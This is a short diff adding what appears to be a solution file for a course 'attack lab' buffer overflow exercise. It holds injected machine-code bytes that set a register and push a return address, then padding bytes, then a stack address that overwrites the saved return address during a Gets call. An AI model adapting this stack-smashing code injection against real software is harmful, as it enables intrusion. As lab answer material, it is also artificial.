@@ -1,0 +1,10 @@
+/* note there are one extra space on both end of the comment region */
+
+48 c7 c7 fa 97 b9 59                /* mov    $0x59b997fa,%rdi */
+68 ec 17 40 00                      /* pushq  $0x4017ec */
+                                    /* swap two lines above is ok */
+c3                                  /* retq */
+01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01 01 01
+78 dc 61 55 00 00 00 00             /* %rsp when calling Gets */
